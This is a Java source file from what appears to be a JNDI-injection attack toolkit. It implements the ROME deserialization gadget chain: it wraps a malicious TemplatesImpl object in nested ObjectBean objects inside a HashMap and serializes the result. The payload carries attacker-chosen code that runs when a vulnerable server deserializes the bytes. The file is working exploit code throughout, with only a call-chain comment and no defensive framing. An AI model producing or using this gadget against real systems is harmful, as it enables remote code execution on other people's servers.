package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.utils.Gadgets;
import com.sun.syndication.feed.impl.ObjectBean;

import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;

/**
 * TemplatesImpl.getOutputProperties()
 * NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
 * NativeMethodAccessorImpl.invoke(Object, Object[])
 * DelegatingMethodAccessorImpl.invoke(Object, Object[])
 * Method.invoke(Object, Object...)
 * ToStringBean.toString(String)
 * ToStringBean.toString()
 * ObjectBean.toString()
 * EqualsBean.beanHashCode()
 * ObjectBean.hashCode()
 * HashMap<K,V>.hash(Object)
 * HashMap<K,V>.readObject(ObjectInputStream)
 *
 * @author mbechler
 */
public class ROME implements ObjectPayload<Object> {
    @Override
    public byte[] getBytes(PayloadType type, String... param) throws Exception {
        Object                o        = Gadgets.createTemplatesImpl(type, param);
        ObjectBean            delegate = new ObjectBean(Templates.class, o);
        ObjectBean            root     = new ObjectBean(ObjectBean.class, delegate);
        ByteArrayOutputStream baous    = new ByteArrayOutputStream();
        ObjectOutputStream    oos      = new ObjectOutputStream(baous);
        oos.writeObject(Gadgets.makeMap(root, root));
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }

    @Override
    public Object getObject(String command) throws Exception {
        return null;
    }
}
